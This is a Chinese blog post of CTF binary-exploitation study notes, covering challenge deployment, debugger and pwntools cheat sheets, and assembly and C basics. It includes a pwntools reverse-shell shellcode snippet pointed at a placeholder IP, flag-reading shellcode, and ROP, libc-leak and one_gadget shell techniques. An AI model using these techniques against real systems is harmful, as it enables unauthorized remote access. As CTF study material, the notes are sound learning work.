---
title: "PWN笔记"
description: 
date: 2024-10-09
image: /img/note.jpg
math: 
license: 
hidden: false
comments: true
draft: false
categories:
    - notes
    - pwn

typora-root-url: ..\..\..\..\..\static
---



## 出题知识

gcc编译pwn题时：

- NX：**-z execstack / -z noexecstack** (关闭 / 开启)    不让执行栈上的数据，于是JMP ESP就不能用了
- Canary：**-fno-stack-protector /-fstack-protector / -fstack-protector-all** (关闭 / 开启 / 全开启)  栈里插入cookie信息
- PIE：**-no-pie / -pie** (关闭 / 开启)   地址随机化，另外打开后会有get_pc_thunk
- RELRO：**-z norelro / -z lazy / -z now** (关闭 / 部分开启 / 完全开启)  对GOT表具有写权限
- Arch：**-m32**对文件进行32位的编译

使用**ctf_xinetd项目**搭建部署pwn出题环境，尝试了多题部署但最终未能实现，于是转向单题部署且能打通test1，

**部署过程：**

```Bash
#把项目克隆下来
 git clone https://github.com/Eadom/ctf_xinetd
 #把flag和二进制程序放入bin目录中，并且按照readme修改ctf.xinetd
 
#在ctf_xinetd目录下构建容器(注意后面有个点)
 docker build -t "pwn" .
 
#运行该镜像(pub_port改成你想要放置的端口)
 docker run -d -p "0.0.0.0:pub_port:9999" -h "pwn" --name="pwn" pwn
#部署完成
```

**相关命令：**

```Bash
# 查看端口连接：
 sudo netstat -antp | grep docker
 
# 查看连接所在进程：
 sudo lsof -i:[端口号]
 
# 断开连接：
 sudo kill -9 [PID]
 
# 关闭docker
 docker kill [PID]
```

出现镜像冲突

```Bash
 docker ps -a
 docker rm [CONTAINER ID]
```

**2台pwn机su root密码更改为了123456**

出题的时候要考虑

```C
setbuf(stdin, 0);
setbuf(stdout, 0);
fflush(stdout); //手动刷新缓冲区，将缓冲区输出到屏幕
```

## 工具

### Docker

```Bash
docker pull xxx/xxx:last # 拉取docker镜像
docker images # 查看镜像
docker rmi <CONTAINER IMAGE ID> # 删除镜像

docker start <CONTAINER ID> # 开启容器
docker stop <CONTAINER ID>  # 关闭容器
docker ps -a # 查看容器
docker rm -f <CONTAINER ID> # 删除容器
```

**生成容器**

```Bash
 sudo docker run -p 18022:22 -p 18080:80 -i -t mcc0624/flask_ssti:last bash -c '/etc/rc.local; /bin/bash'
```

1. `sudo docker run`：运行Docker容器。
2. `-p 18022:22`：将容器内的SSH服务绑定到主机的18022端口，以便可以通过SSH连接到容器内。
3. `-p 18080:80`：将容器内的Web服务绑定到主机的18080端口，以便可以通过Web浏览器访问容器内的Web应用程序。
4. `-i -t`：以交互式和伪终端的方式运行容器。
5. `mcc0624/flask_ssti:last`：使用mcc0624/flask_ssti:last镜像作为容器的基础镜像。
6. `bash -c '/etc/rc.local; /bin/bash'`：在容器内执行两个命令，分别为执行`/etc/rc.local`和启动一个交互式的Bash终端(`/bin/bash`)

### Pwndocker

使用：

```Python
docker-compose up -d
docker exec -it pwn_test /bin/bash
```

docker与主机传文件

```Bash
docker ps -a #查看CONTAINER ID 或 NAMES
docker inspect -f '{{.Id}}' NAMES #根据ID或NAMES拿到ID全称
docker cp 本地文件路径 ID全称:容器路径
```

**在自定义libc版本中运行**

```Python
cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so
patchelf --set-interpreter /tmp/ld-2.27.so ./test
LD_PRELOAD=./libc.so.6 ./test
```

或

```Python
from pwn import *
p = process(["/path/to/ld.so", "./test"], env={"LD_PRELOAD":"/path/to/libc.so.6"})    
```

### Alpha3

### Glibc-all-in-one

多版本libc

```Bash
./libc-x.xx.so # 查看相应版本的链接器
cd glibc-all-in-one
cat list or cat old_list
sudo ./download x.xx-xubuntux_amd64 #下载glibc，会存放在libs文件夹中
sudo ./download_old x.xx-xubuntux_xxx #下载old_list中的
```

若无法下载，可以进入官网（[ubuntu](http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/)、[清华镜像](https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/)）找到deb文件自行下载下来拷贝到debs文件夹中，libs相应文件中创建`.debug`文件，执行：

```Bash
sudo ./extract debs/libc6_x.xx-0ubuntu5_amd64.deb libs/x.xx-0ubuntu5_amd64/
sudo ./extract ~/libc6-dbg_2.26-0ubuntu2_i386.deb libs/x.xx-0ubuntu5_amd64/.debug/
```

### LibcSearcher

```Python
libc = LibcSearcher("printf", printf_addr)
system_addr = offset + libc.dump("system")
binsh_addr = offset + libc.dump("str_binsh")
```

### Patchelf

若无相应链接将会产生错误

```Bash
./pwn: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./pwn)
```

一般情况

```Bash
jshiro@ubuntu:~/Desktop/ctf/smashes$ ldd ./smashes 
        linux-vdso.so.1 (0x00007fff3c996000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb20380c000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fb203a46000)
```

改变程序的链接库路径，使用工具修改libc文件

```Bash
sudo ln ld-x.xx.so /lib64/ld-x.xx.so
#生成符号连接以使gdb能够调试，若未设置跳转到pwndbg调试解决问题

patchelf --set-interpreter ld-x.xx.so elf #来修改文件ld.so
patchelf --replace-needed old_libc.so new_libc.so elf  #来修改文件libc.so
#尽量使用相对路径

#用这个！！成功了
patchelf --set-interpreter ./glibc-all-in-one/libs/ubuntu/ld.so --set-rpath ./glibc-all-in-one/libs/ubuntu elf
```

或者

```Python
p = process(['~/name/x.xx-3ubuntu1_amd64/ld-x.xx.so', './elf'], env={"LD_PRELOAD":'~/name/x.xx-3ubuntu1_amd64/libc.so.6'})
```

**注意：在单个libc版本中还有多个版本，需要多次在本地尝试**

需要在gdb中设置

```Bash
set debug-file-directory debug/
```

### seccomp-tools

```Bash
seccomp-tools dump ./xxx #查看是否存在沙箱保护，只能执行允许的系统调用函数
```

### tmux

![img](/img/pwn_note.zh-cn.assets/-17284427308283.assets)

**命令行中**

```Bash
tmux ls # 查看session
tmux new -t name # 创建新的session, name
```

**tmux指令**

prefix更改为了`ctrl + a`，默认为`ctrl + b`

`gdb.attach`先要打开tmux，转换屏幕使用`ctrl + b + 上下左右键`

`ctrl + B + [`可实现上下翻页

`ctrl + B + d`可以从tmux中退出且保留tmux，重新进入输入`tmux a-t name/number`

复制：

1. 输入``+[`进入复制模式
2. 单击`空格键`开始复制，移动选择复制区域
3. 单击`回车键`复制选中文本并退出复制模式
4. 按下``+]`粘贴文本

Pane指令：

```Plain
ctrl + b + " #下方新建 改为-
ctrl + b + % #右方新建 改为|
ctrl + b + x #关闭
ctrl + b + [space] # 调整布局
ctrl + b + z # 面板缩放, 最大最小化

调整面板大小快捷键改为：ctrl + ikjl
调整面板上下左右：ikjl
```

Window指令：

```Plain
ctrl + b + c # 新建窗口
ctrl + b + & # 关闭
Ctrl + b + 0~9 # 切换到指定索引窗口
Ctrl + b + p # 切换到上一个窗口
Ctrl + b + n # 切换到下一个窗口
ctrl + b + w # 列出windows
ctrl + b + , # 重命名
```

显示时间：prefix + t

**分屏复用**

```Plain
tmux list-sessions    #查看sessions
tmux list-windows     #查看windows
tmux list-panes       #查看panes

tmux send-keys -t <sessions>:<windows>.<panes> "content" Enter
```

**使用系统粘贴板**：按`prefix`+ `Ctrl`+`c`键，buffer缓存的内容将通过`xlip`程序复制到粘贴板，按`prefix`+ `Ctrl`+`v`键，tmux将通过`xclip`访问粘贴板命令，然后由set-buffer设置给buffer缓存，最后由paste-buffer粘贴到tmux会话中。

### ropper

```Bash
#寻找gadget
ropper --file [file_name] --search "汇编指令"
```

### IDA

一般直接进入`Exports`中找`start`

按键`n`重命名

对函数按键`x`可以看到索引-交叉引用（何处被调用），按`y`可以看到函数及变量声明，并可以**修改参数、数据类型（使用u可以undefine）**

按键`r`可以将数字转为字符，还原为数字使用`h`，还原为原数据用`u`

选中代码段输入`/`可以添加注释

显示机器码：Options > General > Number of opcode bytes > 10

汇编与c语言代码对照显示：ctrl + A 选中伪c代码 > 右键 > Copy to assembly

**右键可以将数字转化为十六进制、十进制、八进制、字符类型显示**

Strings window：`shift + F12`

段信息：`ctrl + s`

折叠一长串变量： `右键` > `Collapse declarations`

标记已经反编译完的：`右键` > `Mark as decompiled`

直接修改汇编代码：`右键` > `Keypatch` > `Patcher`

字符串不连接在一起，导出使用：`Edit` > `Export data` 选择如何导出

IDA直接**创建结构体**分析：

- `View` > `Open subviews` > `Local types` or `shift + F1`
- `右键` > `Insert` or `ins键`
- 写入新的结构体，不断更新，F5重新反编译
  - ```C
    struct somestruct{
        type xxx;
        _DWORD unknown_0;  //4字节
        char buf[64];      //0x40
        void* ptr;         //是指针则先用void* 之后可以将void更改为对应的数据类型
    };
    ```
- 同样可以使用`typedef`将长的类型取别名

IDA虚拟地址的偏移很可能不可靠

```Assembly
.rodata:08048668 aHaveYouHeardOf db 'Have you heard of buffer overflow?',0
.rodata:08048668                                         ; DATA XREF: main+49↑o

#rodata只读数据节，    DATA XREF表示该字符串在main的多少偏移中引用了
```

输入`g`然后输入地址可直接跳转

**IDA反汇编函数转栈帧：**

```C
  char **v3; // ST04_4
  int v4; // ST08_4
  char src; // [esp+12h] [ebp-10Eh]
  char buf; // [esp+112h] [ebp-Eh]
  _DWORD *v8; // [esp+11Ch] [ebp-4h]
```

如果变量多，尽量使用esp的相对便宜来分析栈帧

栈帧结构：

![img](/img/pwn_note.zh-cn.assets/-17284427307471.assets)

若调用函数foo，则对栈帧进行改变：

![img](/img/pwn_note.zh-cn.assets/-17284427307482.assets)

```C
LODWORD(x)//从x中提取低位dword
HIDWORD(x)//从x中提取高位dword
```

堆中一些伪代码：

```C
(0x4002c7)(var) 等价于 func(var)
//地址形式调用函数
o = malloc(0x28uLL);
*((_QWORD *)o + 3) = greetings;
//表示将greetings函数的地址放在o指针向后偏移 3 * 8 bytes的位置
```

遇到函数定义歪的情况： `u`取消错误的函数定义 > `c` > 正确的函数位置`p`

```C
__int64 a1@<rbp> // a1 传递方式通过 rbp 寄存器
```

### pwntools

```Python
from pwn import *

context(log_level = 'debug', arch = 'i386', os = 'linux', terminal = ['tmux', 'sp', '-h'])
#需要保证tmux已经运行

io = process("./xxx") # pid xxxx
io = remote("ip", port)

# p64(8)： 0x0000000000000008

text = io.recvline()[a:b] #可以使用切片获取返回值
io.recvline()    io.recv()    io.recvuntil(b'xxx\n') # 直到接受到\n
io.send(p32(0) + b"abc\x0a") #输入必须为字节流 需要关注，前一个sendline可能影响后一个send
io.sendline(b"") #自动会加一个\n换行
io.send(b'xxx\n') # 在送入不包含\n时还需要人工输入\n才会getshell
io.sendlineafter(b"xx", input_something)

#取返回值（地址）的方法，输入以 "a"结尾
p.recvuntil(b"0x")
address = int(p.recvuntil(b"a", drop=True), 16)

#64位中获取地址
u64(p.recv(6).ljust(8, "\x00")
canary_add = u64(io.recv(8)) - 10

# 自使用获取栈地址stack addr 0x10需自调整
addr = io.recvuntil(',')[:-1]
ebp_addr = int("0x" + str(addr[::-1].hex()), 16) - 0x10

leak_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(leak_addr))

gdb.attach(io, "b main")
    
io.interactive()
```

`\x00` 为一字节

shellcode模块

```Python
context.arch = "amd64"

print(asm(shellcraft.sh())) #将shellcode的汇编代码直接转化为机器码 均为32位机器shellcode
print(asm(shellcraft.amd64.sh())) #64位机器的shellcode

shellcode = asm(pwnlib.shellcraft.amd64.linux.cat2("/flag", 1, 0x30))#读取/flag，输出到标准输出
shellcode = asm(pwnlib.shellcraft.amd64.linux.socket("ipv4", "tcp") +\
                pwnlib.shellcraft.amd64.linux.connect("x.x.x.x", 8888, 'ipv4')+\
                pwnlib.shellcraft.amd64.linux.dupsh('rax')
                #反弹shell

asm(shellcraft.sh()).ljust(112, b'A') #ljust在shellcode基础上左对齐，后面补充A直到112个
```

**elf+libc**

```Python
# 返回的是整型
elf = ELF("./xxx")#获取ELF文件的信息
hex(next(elf.search(b"/bin/sh")))#获取/bin/sh的地址
#获取文件基地址
hex(elf.address)
#获取函数/变量/符号地址
hex(elf.symbols['函数/变量/符号名'])
#获取函数在got表表项的地址
hex(elf.got['函数名'])
#获取函数PLT地址
hex(elf.plt['函数名'])

libc = ELF("libc.so.6") # 获取libc文件信息, 若函数在libc中而不在文件的plt中, 使用此找函数偏移
hex(libc.sym['函数名'])
```

**ROP**

```Python
rop = ROP(elf)

pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
```

打印

```Python
success("libcBase -> {:#x}".format(libcBase)) # x表示转化为16进制
```

对**heap**统一函数操作：

```Python
def add(size):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('size?')
    p.sendline(str(size))

def edit(idx,content):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil('idx?')
    p.sendline(str(idx)) # 有时为 str(idx).encode()
    p.recvuntil('content:')
    p.sendline(content)

def show(idx):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('idx?')
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil('idx?')
    p.sendline(str(idx))
```

### pwndbg

切换gdb插件gef、peda、pwndbg：`vim ~/.gdbinit`

gdb中的栈地址很大概率不可靠，且默认关闭了ASLR

```Python
#exp调试时下断点在malloc函数
b malloc
c #继续
xxx  #终端输入执行操作 + 回车
#下断点
b *0x8048000 #汇编地址
b main
b 9 #c语言行号
b xx if i=100 # 条件断点

info b #查看断点
d num  #删除断点
disable num # 使断点不能
#断在函数下，先调试找到 call malloc@plt 的地址，再下断点

# 设置参数
set args 1 2 3 4

#进入入口
start

#运行
r

# 跳出，执行到函数返回处
finish

# 查看栈帧信息
info frame 0 # 0 为索引

#步进stepin 进入函数
s  #C语言级
si #汇编语言级

#步过next   跳过函数
n  #C语言级
ni #汇编语言级

#继续 从断点到另一个断点
c

backtrace # bt显示函数调用关系
return #从函数出来

# core文件在程序段错误时会产生，通过ulimit命令开启
gdb elf_file core # 调试到dump的位置
gdb elf_file PID
#寻找 <正则>
search xxx

#找到变量地址
print &__libc_argv[0]

#查看寄存器内容
x/10gx $rsp+0x10    

#打印符号的值，如：ptr指针指向的值
p 符号
p &printf # printf函数的地址
p/x *(long *)($rbp-0x40) # 查看rbp-0x40地址处的值，十六进制形式
p/d $rsp # 查看rsp寄存器中的值，十进制形式
p $rsp+0x50 # 查看rsp+0x50的地址 假设回显$1
p $rsp - $1 # 可以此查看rsp与$1地址的距离
x/20gz &_IO_2_1_stdout_ # 查看IO_FILE结构 
p _IO_2_1_stdout_

p x = 1 # 改值

p main_arena # 查看main_arena
p &main_arena.mutex #地址

#格式化字符串中，自动计算格式化参数与address的偏移
fmtarg address
#查看栈 数量
stack xxx
# esp 和 ebp 之间的是当前执行的函数的栈帧，ebp 指向的是前一个函数的 ebp 的值

vmmap #获取调试进程中节的虚拟映射地址范围
      #vmmap可见到内存中的动态链接库区域
# libc基址
libc

#求偏移
distance address1 address2
```

**查看栈中的时候出现`0xffff → 0xfffc ← 'aaa'`表示`0xffff`地址处存放着一个指针，指针指向`'aaa'`**

**查看内存：**

```Bash
x/nfu <addr>
# n：表示要显示的内存单元个数
# f：表示显示方式    x:十六进制    d:十进制    u:十进制无符号整型    o:八进制
#                   t:二进制    a:十六进制    i:指令地址格式    c:字符格式
#                   f:浮点数格式
# u：表示一个地址单元的长度    b:单字节    h:双字节    w:四字节    g:八字节

x/10gx address #一般
x/20i func #查看函数反汇编代码
```

**exp动态调试**：

1. exp的输入send前加入`raw_input()`，然后执行exp，
2. `ps -ef | grep pwn_elf`找到PID
3. 另一个窗口`gdb attach PID`，在gdb中`disass main`找到漏洞点和结束前的断点位置，`b * 0xaaaa`，输入`c`，在exp中回车。
4. 或代码中在输入payload前加入`gdb.attach(io)`和`pause()`，然后终端任意按键查看gdb变化

```Python
plt #查看plt表
got #查看got表
```

同时调试父进程与子进程

```Bash
set detach-on-fork off
```

堆调试：

```Bash
fastbin #查看fastbins
heap #查看堆
arenainfo # 查看main_arena
vis # 不同颜色可查看堆情况
tcache # tcache详细信息
```

应对PIE

```Bash
b *$rebase(0x偏移地址)
```

**解决问题：**

```Bash
pwndbg> heap
heap: This command only works with libc debug symbols.
They can probably be installed via the package manager of your choice.
See also: https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html

E.g. on Ubuntu/Debian you might need to do the following steps (for 64-bit and 32-bit binaries):
sudo apt-get install libc6-dbg
sudo dpkg --add-architecture i386
sudo apt-get install libc-dbg:i386
```

该命令可查看单独调试信息文件的目录**`show debug-file-directory`**

- 用gdb进行调试，显示一些堆栈格式需要在gdb中设置debug文件夹，从`glibc-all-in-one`中复制`.debug`文件夹到题目目录中

```Bash
cp -r ~/tools/glibc-all-in-one/libs/x.xx-3ubuntu1_amd64/.debug/ ./debug
```

- gdb中设置`debug file`就能正常使用gdb功能

```Python
set debug-file-directory debug/
```

### Pwngdb

```Bash
parseheap    #解析堆的排布
magic    #打印 glibc 中有用的变量和函数
heapinfoall    #打印所有线程堆的信息
bcall    #在所有xx函数调用下断点
tls    #打印线程本地存储地址
fpchain    #显示FILE的链接列表
```

### gdb-dashboard

```Bash
#下载 适合单独调试 调IOT
wget -P ~ https://github.com/cyrus-and/gdb-dashboard/raw/master/.gdbinit
pip install pygments
```

GDB调试组合：

1. pwndbg + Pwngdb：适用于userland pwn
2. gef + Pwngdb：适用于qemu/kernel pwn

### ROPgadget

生成构造ROP链

```Bash
ROPgadget --binary xxxfile --only "pop|ret" | grep rdi   #只含有pop和ret的指令
ROPgadget --binary xxx --ropchain #自动生成ROP链
```

### one_gadget

```Bash
one_gadget libc_file
# 一个地址就可以完成攻击目的
# 获取libc文件中的一个利用路径，即找到libc偏移xxx地址的地方，满足约束条件即可一步getshell
# 构造libcBase + xxx(地址)覆盖return地址即可

jshiro@ubuntu:~/Desktop/ctf/xmcve/ROP/ret2libc3$ one_gadget /lib/i386-linux-gnu/libc.so.6
0xdee03 execve("/bin/sh", [ebp-0x30], [ebp-0x2c])
constraints:
  address ebp-0x20 is writable
  ebx is the GOT address of libc
  [[ebp-0x30]] == NULL || [ebp-0x30] == NULL
  [[ebp-0x2c]] == NULL || [ebp-0x2c] == NULL

0x172841 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL
#操作
one_gadget -b [BuildID[sha1] of libc] #BuildID用file获取
one_gadget xxxxxx -l 2
```

### VSCODE

`shift+alt+↓`：快捷复制一行

调试时`监控`双击

- `&var`可以看var变量的地址
- `&var.subvar`可以看var结构体的其中一个类型变量的地址

### git

```Bash
git init # git初始化, 会生成.git文件
git help init # 查看帮助
git status # 查看git commit状态

git add file # 加入cache缓冲区
git add -p file # 交互式添加文件 s拆分 y添加暂存区 n不添加暂存区 q退出

git commit -m "name" # 从缓冲区提交
git log --all --graph --decorate --oneline # 查看提交情况及信息
git cat-file -p <object> # <object>是一个对象的哈希值, 查看某个commit对象的详细信息
git checkout <object/branch> # 工作目录和索引切换到指定的对象或引用或分支

git diff <object> file # 可以查看某个提交与当前工作目录(HEAD)间文件的更改
git diff <object1> <object2> file # 比较两次提交间文件变化
git diff --cached # 查看已暂存的更改

git branch # 列出本地分支, * 标记当前分支, -r 远程分支, -a 所有分支 -vv 更详细
git branch <branch-name> # 创建新分支
git branch --set-upstream-to=<remote_name>/<remote_branch> # 关联本地分支和远程分支
git checkout -b <new-branch> # 创建并切换到新分支

git merge xx # 合并分支到主分支
git merge --abort # 发生冲突时使用命令暂停 进入文件会有冲突提示, 删除并修改
git add file; git merge --continue # 解决冲突继续前先将文件加入cache缓冲区

git remote # 查看远程仓库
git remote add origin <url> # 将新的远程仓库添加到本地git仓库

git push <remote_name> <local branch>:<remote branch> 
# git push origin master:master 本地分支更改提交到远程仓库指定分支

git fetch # 下载最新提交和更新
git pull = git fetch; git merge # 下载最新信息后合并更新到本地分支
git clone --shallow # 只包含最近的提交，而不是整个提交历史

git stash # 临时保存当前工作目录和暂存区的更改到堆栈
git stash pop # 恢复并删除stash

vim .gitignore # 将需要忽略不提交的文件写入, 可用正则匹配
```

## Linux

存在一些内置命令：`cd, echo, read, pwd, source`，若没有`cat`等，可以通过以下代码在shell直接逐行查看文件内容

```Bash
while IFS= read -r line; do
    echo "$line"
done < filename
```

当使用`rm`删除某个文件后，可通过以下方法恢复

```Bash
lsof | grep deletefile # 找到进程
cp /proc/self/fd/1 ~/deletefile.backup # self表示当前进程

[root@docking ~]# cd /proc/21796/fd
[root@docking fd]# ll
总用量 0
lrwx------ 1 root root 64 1月  18 22:21 0 -> /dev/pts/0
l-wx------ 1 root root 64 1月  18 22:21 1 -> /root/deletefile.txt (deleted)
lrwx------ 1 root root 64 1月  18 22:21 2 -> /dev/pts/0
```

**Debian**

- Debian安装python包时不用pip install命令，而是直接使用`apt install python3-包名`
- 将安装包tar.gz下载后解压
  - ```JSON
     tar xzf xxx.tar.gz
     cd xxx
     python3 setup.py install
    ```
    
  - ```python
    # 使用虚拟环境
    apt install python3-venv
    pthon3 -m venv myenv
    source myenv/bin/activate
    pip install xxx
    ```
  
    



### readelf

分析ELF程序的工具，可以查看所有节头信息

```Bash
readelf -e xxx
```

### objdump

分析二进制文件的工具

```Bash
objdump -d xxx -M intel
```

### hexdump

分析文件的十六进制

### ldd

用于查看程序连接的所有库

```Bash
jshiro@ubuntu:~/Desktop/ctf/xmcve/ROP$ ldd ret2stack
        linux-vdso.so.1 (0x00007ffc561bb000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f17383a4000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f17385de000)
#libc.so.6软连接 
```

### strings

```Bash
strings 可执行程序 #查看一些字符串如/bin/sh

strings libc.so.6 | grep version # 查看libc版本
```

### gcc

```Bash
-S #汇编
-g #gdb调试时显示c源代码而不是汇编代码
--static #静态链接
-Wall -Wextra # 开启告警
```

**小知识**

```Python
with open("a", "wb") as f:
    f.write(b'abcdefg\x08\x08')
# \x08为退格键即backspace, 在linux中使用cat a时将只会读出abcde
```

## 基础知识

虚拟内存mmap段中的动态链接库仅在物理内存中装载一份

### Glibc

- glibc-2.23：ubuntu16.04
- glibc-2.27：ubuntu18.04
  - 加入了tcache
- glibc-2.29：ubuntu19.04
- glibc-2.30~31：ubuntu20.04
- glibc-2.34：ubuntu22.04

ubuntu下查看glibc版本

```Bash
getconf GNU_LIBC_VERSION

ldd --version
```

### x86 & amd64

**CPU架构：**

- CISC复杂指令集：intel、AMD的x86
- RISC精简指令集：ARM、MIPS、Power PC

intel (英特尔)与 amd (超威半导体)是x86架构CPU制造商

ARM公司是arm架构CPU制造商

**amd64**是**X86**架构的**CPU**，64位版。**amd64**又叫X**86_64**。主流的桌面PC，笔记本电脑，服务器（包括虚拟机）都在用X86_64的CPU

**arm64**是**ARM**架构的**CPU**，64位版。有些路由器、嵌入式设备、手机、安卓平板电脑在用arm64的CPU

**MIPS**是**MIPS**架构的CPU。有些嵌入式设备和家用路由器在用MIPS的CPU

x86 和 x86_64 : 基于X86架构的不同版本, 位数不同，32位和64位

x86_64 = x64 = amd64

x86版本是Intel率先研发出x86架构, x86_64版本(也称x64)是amd率先研发x86的64位版本, 所以x86_64也叫amd64

x86：一个地址存4个字节；amd64：一个地址存8个字节

```Bash
nasm -f elf32/elf64 xxx        #编译
ld -m elf_i386/elf_x86_64 xxx  #链接
```

**系统调用syscall**参数传递

x86_32：参数小于等于6个，ebx,ecx,edx,esi,edi,ebp中；大于6个，全部参数放在一块连续内存区域，ebx保存指向该区域的指针

使用`int 0x80`

x86_64：参数小于等于6个，rdi,rsi,rdx,r10,r8,r9；大于6个，全部参数放在一块连续内存区域，rbx保存指向该区域的指针

使用`syscall`，rax放每个system call函数对应的索引

**函数function**参数传递

x86_32：从右至左顺序压参数入栈

x86_64：参数少于7个时，从左到右：rdi,rsi,rdx,rcx,r8,r9中，大于7个，后面的从“右向左”放入栈中

### Mips

**32个通用寄存器**

| **编号** | **名称** | **描述**                                       |
| -------- | -------- | ---------------------------------------------- |
| $0       | $zero    | 0号寄存器，始终为0                             |
| $1       | $at      | 保留寄存器                                     |
| $2-$3    | $v0-$v1  | values，保存表达式或函数返回结果               |
| $4-$7    | $a0-$a3  | argument，作为函数前4个参数                    |
| $8-$15   | $t0-$t7  | temporaries，供汇编程序使用的临时寄存器        |
| $16-$23  | $s0-$s7  | Saved values，子函数使用时需先保存原寄存器的值 |
| $24-$25  | $t8-$t9  | temporaries，临时寄存器，补充$t0-$t7           |
| $26-$27  | $k0-$k1  | 保留，中断处理函数使用                         |
| $28      | $gp      | Global pointer，全局指针                       |
| $29      | $sp      | Stack pointer，堆栈指针，指向堆栈的栈顶        |
| $30      | $fp      | Frame pointer，保存栈指针                      |
| $31      | $ra      | Return address，返回地址                       |

**特殊寄存器**

- PC（程序计数器）
- HI（乘除结果高位寄存器）
- LO（乘除结果低位寄存器）

### 汇编语言

```Assembly
lea ; 加载内存地址
mov ; 传递内存地址中的值
test eax, eax ; 等价于eax & eax ,但不影响eax值, 改变标志寄存器值, 判断eax是否为0, 为0则设置ZF
hello: db "hello", 0xa      
;将字符串 "hello" 和一个换行符存储在内存中
len: equ $-hello            
;equ类似于定义/等于, $ 表示当前地址的符号，而 -hello 表示 len 到 hello 的距离
push xx ; esp先减小, 将xx的值压入栈中, 即放入esp所指地址
call func ; 将call的下一条命令压入栈, jmp到函数地址去, call完ret时, call的下一条命令会出栈, 存入eip中执行, 而call的函数的参数仍留在了栈中
vmovdqa ymmword ptr [rcx + 60h], ymm1
# AVX指令集中的SIMD(Single Instruction Mutiple Data)指令，处理256位
# 将ymm1寄存器中的256位数据存储到内存地址[rcx + 0x60]处  ymmword: 32字节
```

**寄存器**

```Bash
rax:   64
eax:   32
ax:    16
al,ah: 8
```

### 问题解决

- 报错：Unexpected entries in the PLT stub. The file might have been modified after linking

下载 https://github.com/veritas501/pltresolver 到plugins文件夹中，然后键盘输入 `Ctrl+Shift+J`

- 反汇编失败：Decompilation failure:8048998: call analysis failed

`Edit - Patch program - Assemble` 改为 nop

- 报错如下：

```JSON
W: GPG 错误：https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY 3B4FE6ACC0B21F32
E: 仓库 “https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security InRelease” 没有数字签名。
N: 无法安全地用该源进行更新，所以默认禁用该源。
```

解决: `sudo apt-key adv --keyserver ``keyserver.ubuntu.com`` --recv-keys 3B4FE6ACC0B21F32`

### C语言

```C
#pragma once // 防止头文件被多次包含, 告诉编译器只包含该头文件一次
```

`\r`用于回车到当前行的开头，`\r`后边的数字替代 这一行最开始的相等数目的数字

```C
printf("123456\r321\n");
//321456即隐藏了123

if ( v1 == -1 ) xxx;    //v1为空或无效
if ( v1 == 10 ) xxx;    //v1为换行符，ASCII值为10

void *ptr[2]; // 声明大小为2的指针数组
```

C语言中字符串以"\x00"结尾，篡改字符串中的"\x00"可以导致泄露后续数据如canary值

**read函数调用的第一个参数：0标准输入，1标准输出，2标准错误**

main函数

```C
int main(void)
int main(int argc, char *argv[]) = int main(int argc, char **argv)
int main(int argc, char **argv, char **envp)
//argc：参数计数
//argv[0]：文件路径名
//argv[1]:第一个字符串
//argv[2]:第二个字符串
//argv[argc]：NULL
```

**内联汇编格式**

```C
asm volatile(
    "instruction list"
    :"=r"(xxx) //output
    :"r(...)"    //input
    :
);
```

**宏**

```C
LODWORD(v4) = 0    //初始化低32位为0
HIDWORD(v4) = 0    //初始化高32位为0
SHIDWORD(v4)       //取高32位并作为有符号整数
```

**SIGSEGV**

```C
#include <signal.h>
signal(SIGSEGV, sigsegv_handler);
//使用该函数在发生segment fault时会调用自己定义的sigsegv_handler函数

// 可查看对应整数
printf("signal: %d\n", SIGABRT); // 6
printf("signal: %d\n", SIGFPE);	 // 8
printf("signal: %d\n", SIGILL);  // 4
printf("signal: %d\n", SIGINT);  // 2
printf("signal: %d\n", SIGSEGV); // 11
printf("signal: %d\n", SIGTERM); // 15
printf("signal: %d\n", SIGALRM); // 14

signal(14, timeout_func);

```

**函数**

```C
long strtol(const char *str, char **endptr, int base);
//将str指向的字符数组转换为长整型
//endptr: 存储转换后的字符串的结束位置
//base: 转换时使用的进制
//接受十进制输入
chr(i)//将Unicode码转换为字符
atoi(&buf); //将 buf 中的字符串转换为整数

getchar(); // 从标准输入读取一个字符，将其作为无符号字符强制转换为int返回
// 在scanf前，则scanf时将需要多加一个字节
__isoc99_scanf("%[^\n]s", v); // 表示输入直到回车

scanf("%d", &array[i]); // 当传入+或-时会跳过scanf不改变该数组中的值

strcmp(v1, v2); // 注意观察值可能在某处可泄露
```

**mmap**

```C
// 文件或设备的内容映射到内存地址空间 或 分配匿名共享内存
void *mmap(void addr[.length], size_t length, int prot, int flags,int fd, off_t offset);
// addr: 映射的起始地址, 传入NULL则OS自动选择
// length: 映射长度, 单位: 字节
// prot: 映射内存的保护模式  PROT_READ 1读 PROT_WRITE 2写 PROT_EXEC 4执行
// flags : 映射的类型, 对映射同一区域的其他进程是否可见
// fd: 文件描述符, 0,-1表示匿名映射: 通常用于分配内存
// offset: 文件偏移量, 从文件该位置开始映射

// 使用 mmap 分配内存 需要用对应的标志的值进行异或! https://sites.uclouvain.be/SystInfo/usr/include/bits/mman.h.html
void *mapped_memory = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

// 文件映射到内存, mapped为指向该映射内存地址起点的指针, 失败则返回MAP_FAILED(-1)
void *mapped = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
```

### Python

**小的匿名函数**

```Python
xx = lambda arg1,arg2:expression
xx(x1,x2)
```

**解释器**

```Python
# 开头
